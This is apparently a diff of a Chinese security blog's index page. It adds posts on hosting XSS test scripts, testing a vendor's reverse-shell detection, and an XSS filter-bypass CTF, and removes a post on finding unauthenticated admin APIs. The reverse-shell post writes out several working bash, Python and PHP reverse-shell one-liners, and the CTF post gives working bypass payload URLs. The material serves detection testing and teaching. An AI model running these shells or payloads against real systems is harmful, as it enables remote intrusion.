@@ -125,12 +125,12 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">53</span>
+          <span class="site-state-item-count">55</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">22</span>
+        <span class="site-state-item-count">23</span>
         <span class="site-state-item-name">标签</span>
       </div>
   </nav>
@@ -159,6 +159,100 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E6%8F%90%E9%AB%98%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E6%95%88%E7%8E%87%E7%9A%84%E5%B7%A5%E5%85%B7/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="leveryd">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="leveryd的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021-12-26-%E6%8F%90%E9%AB%98%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E6%95%88%E7%8E%87%E7%9A%84%E5%B7%A5%E5%85%B7/" class="post-title-link" itemprop="url">提高漏洞验证效率的工具</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>某个xss漏洞点如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">x&#x3D;document.createElement(&quot;script&quot;);</span><br><span class="line">x.setAttribute(&quot;src&quot;, &quot;用户可控的地址&quot;);</span><br><span class="line">document.body.appendChild(x);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>虽然xss漏洞肯定是存在的，但是我不知道利用起来是不是会有问题，比如碰到csp等。</p>
+<p>所以我在”用户可控地址” 填入 “<a target="_blank" rel="noopener" href="http://x.x.x.x/1.js&quot;">http://x.x.x.x/1.js&quot;</a> 来验证，于是出现了点问题。</p>
+<p>第一个问题：https站点引入http静态资源时，浏览器控制台出现”混合内容”警告。似乎会影响js解析</p>
+<p>第二个问题：响应头的content-type需要是text/javascript，否则不能当作js解析</p>
+<p>所以我需要一个web服务：</p>
+<ul>
+<li>支持https</li>
+<li>返回内容可以自定义</li>
+<li>响应头content-type可以自定义</li>
+<li>支持公网访问</li>
+</ul>
+<p>自己去搭这样一个服务也不难，但是如果有现成的岂不是更好，省时省力。</p>
+<p>根据历史经验，我知道有两种平台似乎可以解决我的这个小需求：</p>
+<ul>
+<li>类似 pastebin 的平台，可以通过短链接访问</li>
+<li>xss平台</li>
+</ul>
+<h1 id="测试这些平台是否好用"><a href="#测试这些平台是否好用" class="headerlink" title="测试这些平台是否好用"></a>测试这些平台是否好用</h1><p><a target="_blank" rel="noopener" href="http://ix.io/">http://ix.io</a> : 不支持https</p>
+<p><a target="_blank" rel="noopener" href="http://pastebin.com/">http://pastebin.com</a>: 不支持设置content-type</p>
+<p>搜索到的很多xss平台，都需要邀请码。甚至有的注册成功了，但是使用起来有问题。</p>
+<p>再比如 xssye.com 这个xss平台我很久以前用过。今天登陆提示账号密码登陆不上，申请密码找回提示邮箱和账号对不上，重新注册又提示”需要注册邀请码”。</p>
+<p>总之试了几个，感觉用着比较难受。这些xss平台看前段页面似乎都是一套代码，也不确定是否可能存在漏洞。</p>
+<h1 id="有没有稳定好用的服务"><a href="#有没有稳定好用的服务" class="headerlink" title="有没有稳定好用的服务"></a>有没有稳定好用的服务</h1><p>想起来云上的文件存储服务，刚好是满足我自己的需求的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ curl https:&#x2F;&#x2F;webbackup-3knjfg4bxz.bj.bcebos.com&#x2F;1.js</span><br><span class="line">alert(1);</span><br></pre></td></tr></table></figure>
+
+<p>另外云上的函数服务，还可以写代码对响应做更精细的控制。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>云上的 文件存储、函数服务 等很适合快速在公网提供https服务，而且相对于个人自己搭建的服务要稳定省心得多，推荐使用。</p>
+<p>当然云上也有很坑的服务，就不说了。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -278,7 +372,7 @@ Nginx提供 `lua_regex_match_limit` 指令限制回溯次数</code></pre>
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E7%A5%9E%E5%A5%87%E7%9A%84javascript-%E4%B8%8D%E7%94%A8%E6%8B%AC%E5%8F%B7%E5%B8%A6%E5%8F%82%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E6%9F%90%E5%8E%82%E5%95%86%E7%9A%84%E5%8F%8D%E5%BC%B9shell%E9%98%B2%E6%8A%A4%E8%83%BD%E5%8A%9B%E6%B5%8B%E8%AF%95/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -291,7 +385,7 @@ Nginx提供 `lua_regex_match_limit` 指令限制回溯次数</code></pre>
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-%E7%A5%9E%E5%A5%87%E7%9A%84javascript-%E4%B8%8D%E7%94%A8%E6%8B%AC%E5%8F%B7%E5%B8%A6%E5%8F%82%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0/" class="post-title-link" itemprop="url">神奇的javascript-不用括号带参执行函数</a>
+          <a href="/2021-12-26-%E6%9F%90%E5%8E%82%E5%95%86%E7%9A%84%E5%8F%8D%E5%BC%B9shell%E9%98%B2%E6%8A%A4%E8%83%BD%E5%8A%9B%E6%B5%8B%E8%AF%95/" class="post-title-link" itemprop="url">某厂商的反弹shell防护能力测试</a>
         </h2>
 
         <div class="post-meta-container">
@@ -315,37 +409,48 @@ Nginx提供 `lua_regex_match_limit` 指令限制回溯次数</code></pre>
     
     
     <div class="post-body" itemprop="articleBody">
-          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>两周前，我遇到一个挺有意思的xss，过滤了很多符号，包括<code>&lt;&gt;=()`[]</code>等。</p>
-<p>我将此问题抽象成<a target="_blank" rel="noopener" href="https://04bdb3a0.o53.xyz/a1e60ae3-4bac-4012-a0f3-5b7018677979.php?a=1">ctf题目</a>，题目源码公开在 <a target="_blank" rel="noopener" href="https://gist.github.com/leveryd/40fcaed60727b6163b034145e332640f">github</a>。</p>
-<p>前两天在 <a target="_blank" rel="noopener" href="https://gist.github.com/leveryd/40fcaed60727b6163b034145e332640f">题目评论</a> 中看到有师傅把答案贴出来了，我就说一下这个案例。</p>
-<h1 id="测试时遇到的问题"><a href="#测试时遇到的问题" class="headerlink" title="测试时遇到的问题"></a>测试时遇到的问题</h1><p>实际测试时遇到的问题，也是题目中有两个比较难的地方：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* javascript不用 &lt;&gt;&#x3D;()&#96;[] 等符号，怎么调用函数？</span><br><span class="line">* javascript不用 &lt;&gt;&#x3D;()&#96;[] 等符号，怎么调用函数，并且带上参数？</span><br></pre></td></tr></table></figure>
+          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>工作任务需要测试某厂商的反弹shell检测安全能力</p>
+<p>测试思路：</p>
+<ol>
+<li>挑选测试样本<ul>
+<li>每一种检测策略挑选对应的1-3个样本</li>
+</ul>
+</li>
+<li>测试过程中<ul>
+<li>如果某一类样本中的任意一个样本未通过测试，就不继续测试同类其他样本</li>
+<li>如果某一类样本完全被拦截，就尝试绕过</li>
+</ul>
+</li>
+</ol>
+<p>测试时需要注意下面的点，可能会影响测试结果</p>
+<ul>
+<li>反弹shell后，是否输入命令</li>
+</ul>
+<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><h2 id="挑选测试样本"><a href="#挑选测试样本" class="headerlink" title="挑选测试样本"></a>挑选测试样本</h2><p>按照<code>安全项目/HIDS/业务：入侵检测/反弹shell/3.反弹shell检测.md</code>学习的检测策略，每一种检测策略挑选对应的1-3个样本。</p>
+<ol>
+<li><p>bash进程、默认文件描述符指向socket</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>没有bash进程、默认文件描述符不指向socket</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;exec(\&quot;import socket, subprocess;s &#x3D; socket.socket();s.connect((&#39;127.0.0.1&#39;,2222))\nwhile 1:  proc &#x3D; subprocess.Popen(s.recv(1024), stdout&#x3D;subprocess.PIPE, stderr&#x3D;subprocess.PIPE,shell&#x3D;True);s.send(proc.stdout.read()+proc.stderr.read())\&quot;)&quot;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>对抗行为（使用其他sh解释器）</p>
+   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0&lt;&amp;196;exec 196&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br><span class="line"></span><br><span class="line">php -r &#39;$sock&#x3D;fsockopen(&quot;10.0.0.1&quot;,4242);exec(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>对抗行为（修改sh解释器名称）</p>
+<p>   修改bash、sh</p>
+   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp &#x2F;usr&#x2F;bin&#x2F;bash &#x2F;usr&#x2F;bin&#x2F;x; x -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0&gt;&amp;1      &#x2F;&#x2F; x是bash</span><br><span class="line"></span><br><span class="line">cp &#x2F;usr&#x2F;bin&#x2F;sh &#x2F;usr&#x2F;bin&#x2F;y; 0&lt;&amp;196;exec 196&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;10.0.0.1&#x2F;4242; y &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196  &#x2F;&#x2F; y是sh</span><br></pre></td></tr></table></figure>
 
-<p>第一个问题简单一点：在发生类型转换时，会执行valueOf或者toString属性值指向的函数。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1-&#123;valueOf:function()&#123;alert(1)&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>第二个问题难一点，需要对this的用法比较熟悉。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">在函数外部,this指向window对象</span><br><span class="line"></span><br><span class="line">在函数内部：</span><br><span class="line"></span><br><span class="line">* 普通调用时</span><br><span class="line">  * strict模式下，this指向undeined</span><br><span class="line">  * 非strict模式下，this指向当前对象</span><br></pre></td></tr></table></figure>
-
-<p>还有一些方式改变this指向的对象，包括：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* 调用call函数、apply函数等指定对象</span><br><span class="line">* new构造函数</span><br></pre></td></tr></table></figure>
-
-<p>this涉及的情况比较多，也比较反直觉，这里就不多说了。可以看 <a target="_blank" rel="noopener" href="https://time.geekbang.org/column/article/113399">11 | this：从JavaScript执行上下文的视角讲清楚this</a> 这篇文章。</p>
-<h1 id="题目解法"><a href="#题目解法" class="headerlink" title="题目解法"></a>题目解法</h1><p>我的解法和 @rmb122 师傅一样：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;04bdb3a0.o53.xyz&#x2F;a1e60ae3-4bac-4012-a0f3-5b7018677979.php?a&#x3D;xx%27-&#123;valueOf:test.a,%27call%27:%22%27%22%2blocation.hash&#125;-%27#&#39;;hello(&#39;a&#39;,&#39;b&#39;,&#39;c&#39;);&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
-
-<p>我也把题目发给我做前端开发的朋友，他的解法如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;04bdb3a0.o53.xyz&#x2F;a1e60ae3-4bac-4012-a0f3-5b7018677979.php?a&#x3D;%27%2B&#123;toString:%20test.a,call:%20%27hello%27%2B[...hello%2B%27%27][29]%2B%22%27a%27,%22%2B%22%27b%27,%22%2B%22%27c%27%22%2B[...hello%2B%27%27][56]&#125;%2B%27</span><br></pre></td></tr></table></figure>
-
-<p>中间有个小插曲：在朋友把他的解法发我后，我在代码中添加了对[]符号的过滤，因为我碰到的实际案例中也过滤了[]符号。</p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>虽然当时绕过了xss的过滤，也清楚触发流程，但是我不明白为什么会这么触发。</p>
-<p>所以补了一下和此题相关的语法及概念，包括以下内容：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* 类型转换</span><br><span class="line">* this是什么</span><br><span class="line">* 函数是一等公民</span><br></pre></td></tr></table></figure>
-
-<p>由这个问题想到，是否其他语言有类似场景？比如某个对象可控时，对它做运算会导致函数调用。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">obj &#x3D; &#123;&quot;可控key&quot;:&quot;可控value&quot;&#125;</span><br><span class="line"></span><br><span class="line">操作 obj</span><br></pre></td></tr></table></figure>
-
-<p>这是一个木有答案的问题。</p>
+</li>
+</ol>
+<h2 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h2><p>1 通过</p>
+<p>2、3、4 不通过</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>  4类样本中，仅检测出1类最基础的反弹shell。</p>
+<p>  在测试过程中发现：</p>
+<ul>
+<li>检测到反弹shell后不会立马告警：厂商会检测shell是否执行命令，如果仅仅反弹shell但是没有执行命令就不会被拦截</li>
+</ul>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">Reverse Shell Cheat Sheet</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/263684.html">云上威胁检测 | 详解反弹shell多维检测技术</a></p>
 
       
     </div>
@@ -439,6 +544,100 @@ Nginx提供 `lua_regex_match_limit` 指令限制回溯次数</code></pre>
 </li>
 </ul>
 <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><code>strace -f</code> 真香：不需要我去研究”代码”或者”编译器”是怎么包含”kernel.inc文件”。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E7%A5%9E%E5%A5%87%E7%9A%84javascript-%E4%B8%8D%E7%94%A8%E6%8B%AC%E5%8F%B7%E5%B8%A6%E5%8F%82%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="leveryd">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="leveryd的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021-12-26-%E7%A5%9E%E5%A5%87%E7%9A%84javascript-%E4%B8%8D%E7%94%A8%E6%8B%AC%E5%8F%B7%E5%B8%A6%E5%8F%82%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0/" class="post-title-link" itemprop="url">神奇的javascript-不用括号带参执行函数</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>两周前，我遇到一个挺有意思的xss，过滤了很多符号，包括<code>&lt;&gt;=()`[]</code>等。</p>
+<p>我将此问题抽象成<a target="_blank" rel="noopener" href="https://04bdb3a0.o53.xyz/a1e60ae3-4bac-4012-a0f3-5b7018677979.php?a=1">ctf题目</a>，题目源码公开在 <a target="_blank" rel="noopener" href="https://gist.github.com/leveryd/40fcaed60727b6163b034145e332640f">github</a>。</p>
+<p>前两天在 <a target="_blank" rel="noopener" href="https://gist.github.com/leveryd/40fcaed60727b6163b034145e332640f">题目评论</a> 中看到有师傅把答案贴出来了，我就说一下这个案例。</p>
+<h1 id="测试时遇到的问题"><a href="#测试时遇到的问题" class="headerlink" title="测试时遇到的问题"></a>测试时遇到的问题</h1><p>实际测试时遇到的问题，也是题目中有两个比较难的地方：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* javascript不用 &lt;&gt;&#x3D;()&#96;[] 等符号，怎么调用函数？</span><br><span class="line">* javascript不用 &lt;&gt;&#x3D;()&#96;[] 等符号，怎么调用函数，并且带上参数？</span><br></pre></td></tr></table></figure>
+
+<p>第一个问题简单一点：在发生类型转换时，会执行valueOf或者toString属性值指向的函数。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1-&#123;valueOf:function()&#123;alert(1)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>第二个问题难一点，需要对this的用法比较熟悉。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">在函数外部,this指向window对象</span><br><span class="line"></span><br><span class="line">在函数内部：</span><br><span class="line"></span><br><span class="line">* 普通调用时</span><br><span class="line">  * strict模式下，this指向undeined</span><br><span class="line">  * 非strict模式下，this指向当前对象</span><br></pre></td></tr></table></figure>
+
+<p>还有一些方式改变this指向的对象，包括：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* 调用call函数、apply函数等指定对象</span><br><span class="line">* new构造函数</span><br></pre></td></tr></table></figure>
+
+<p>this涉及的情况比较多，也比较反直觉，这里就不多说了。可以看 <a target="_blank" rel="noopener" href="https://time.geekbang.org/column/article/113399">11 | this：从JavaScript执行上下文的视角讲清楚this</a> 这篇文章。</p>
+<h1 id="题目解法"><a href="#题目解法" class="headerlink" title="题目解法"></a>题目解法</h1><p>我的解法和 @rmb122 师傅一样：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;04bdb3a0.o53.xyz&#x2F;a1e60ae3-4bac-4012-a0f3-5b7018677979.php?a&#x3D;xx%27-&#123;valueOf:test.a,%27call%27:%22%27%22%2blocation.hash&#125;-%27#&#39;;hello(&#39;a&#39;,&#39;b&#39;,&#39;c&#39;);&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>我也把题目发给我做前端开发的朋友，他的解法如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;04bdb3a0.o53.xyz&#x2F;a1e60ae3-4bac-4012-a0f3-5b7018677979.php?a&#x3D;%27%2B&#123;toString:%20test.a,call:%20%27hello%27%2B[...hello%2B%27%27][29]%2B%22%27a%27,%22%2B%22%27b%27,%22%2B%22%27c%27%22%2B[...hello%2B%27%27][56]&#125;%2B%27</span><br></pre></td></tr></table></figure>
+
+<p>中间有个小插曲：在朋友把他的解法发我后，我在代码中添加了对[]符号的过滤，因为我碰到的实际案例中也过滤了[]符号。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>虽然当时绕过了xss的过滤，也清楚触发流程，但是我不明白为什么会这么触发。</p>
+<p>所以补了一下和此题相关的语法及概念，包括以下内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* 类型转换</span><br><span class="line">* this是什么</span><br><span class="line">* 函数是一等公民</span><br></pre></td></tr></table></figure>
+
+<p>由这个问题想到，是否其他语言有类似场景？比如某个对象可控时，对它做运算会导致函数调用。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">obj &#x3D; &#123;&quot;可控key&quot;:&quot;可控value&quot;&#125;</span><br><span class="line"></span><br><span class="line">操作 obj</span><br></pre></td></tr></table></figure>
+
+<p>这是一个木有答案的问题。</p>
 
       
     </div>
@@ -997,147 +1196,6 @@ Nginx提供 `lua_regex_match_limit` 指令限制回溯次数</code></pre>
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE-%E6%94%BB%E9%98%B2%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%AE%9E%E8%B7%B5%EF%BC%88%E4%B8%80%EF%BC%89/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="leveryd">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="leveryd的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE-%E6%94%BB%E9%98%B2%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%AE%9E%E8%B7%B5%EF%BC%88%E4%B8%80%EF%BC%89/" class="post-title-link" itemprop="url">安全建设-攻防思路及实践（一）</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>以前挖国内src时的一个套路：</p>
-<p>通过”寻找管理后台 + 寻找api接口 + burp验证api接口”来找未授权api</p>
-<p>找到未授权api后，根据api功能就能造成不同危害：</p>
-<ul>
-<li>比如利用”重置密码接口”来重置管理员密码，然后登陆后台</li>
-<li>比如利用”查数据接口”获取数据</li>
-</ul>
-<p>个人觉得这个套路比较好用，原因在于：</p>
-<ul>
-<li>没有攻击payload，waf、nids等安全设备比较难检测（虽然可能按照访问404频率和比例等特征封禁）</li>
-<li>“管理后台对外开放”和”api接口未授权访问”，个人感觉这两个风险在企业里很难靠”技术手段”完全杜绝</li>
-<li>大部分检测工作可以用工具完成</li>
-</ul>
-<p>也有不好的地方，在于：</p>
-<ul>
-<li>整个流程没有完全自动化，需要人工做重复性的事情，比如判断是否是管理后台</li>
-</ul>
-<h1 id="详细过程"><a href="#详细过程" class="headerlink" title="详细过程"></a>详细过程</h1><ul>
-<li><p>怎么找”管理后台”？</p>
-<p>大概分三步：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* 第一步筛出可能的管理后台地址</span><br><span class="line">* 第二步将首页截图保存成本地</span><br><span class="line">* 第三步人工浏览截图</span><br></pre></td></tr></table></figure>
-
-<p>第一步筛选管理后台地址的策略包括：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">* 域名中包含关键词，直接当作后台管理系统</span><br><span class="line">* 30x跳转地址包含关键词</span><br><span class="line">* 响应html中包含table标签（因为有可能后台管理首页就存在未授权访问，数据展示时会用到table标签）</span><br><span class="line">* 判断页面是否是vue框架写的（因为很多开发喜欢选择用vue来做管理系统）</span><br></pre></td></tr></table></figure>
-
-<p>脚本片段：<a target="_blank" rel="noopener" href="https://gist.github.com/leveryd/334b719e253261ffd0abfd161e499ae7">https://gist.github.com/leveryd/334b719e253261ffd0abfd161e499ae7</a></p>
-</li>
-<li><p>怎么找api接口？</p>
-<p>从js文件文本中找，策略如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* 将js代码中字符串常量提取出来</span><br><span class="line">* 字符串常量匹配 &#96;&#x2F;[\w\d\-.&#x2F;]+&#96; 且不以 &#x2F;&#x2F; 字符开头，认为是api路径</span><br><span class="line">* 字符串常量匹配 &#96;[\w\d\-]+&#x2F;[\w\d\-.&#x2F;]+&#96; 且不以 &#x2F; 字符开头，认为是api路径</span><br></pre></td></tr></table></figure>
-
-<p>脚本片段：<a target="_blank" rel="noopener" href="https://gist.github.com/leveryd/465d19610d5fcf99199beb9284cd6f8c">https://gist.github.com/leveryd/465d19610d5fcf99199beb9284cd6f8c</a></p>
-<p>这种方式不需要前端存在sourcemap泄漏。</p>
-<p>当然如果前端有sourcemap信息就更好，这样可以利用 <a target="_blank" rel="noopener" href="https://github.com/SunHuawei/SourceDetector">利用sourcemap还原前端项目-浏览器插件</a> 这种工具还原前端项目，代码阅读性更好一些。接着对前端项目做代码审计，有可能在前端代码中看到 啥token、啥功能比较特殊的api接口（比如上传文件）。</p>
-</li>
-<li><p>怎么使用burpsuite验证api接口？</p>
-<p>将找到的api接口放到burpsuite批量验证，根据 响应状态码、响应长度、响应内容 来判断是否有未授权的api接口。</p>
-<p>测试过程中可以变换请求方法：GET、POST、PUT</p>
-<p>确认存在未授权接口后，再人工从前端js中找参数值利用。</p>
-</li>
-</ul>
-<h1 id="成果"><a href="#成果" class="headerlink" title="成果"></a>成果</h1><ul>
-<li>[评级高危-顺丰某系统后台API接口未做认证导致用户信息泄漏]</li>
-<li>[评级高危-顺丰某系统未授权导致获取后台管理权限，可查看大量订单信息]</li>
-<li>[评级高危-字节某业务线后端接口未授权访问]</li>
-<li>[评级中危-腾讯广告后台接口未认证]</li>
-<li>[评级低危-后台API接口存在未授权访问(可增删改数据)]</li>
-</ul>
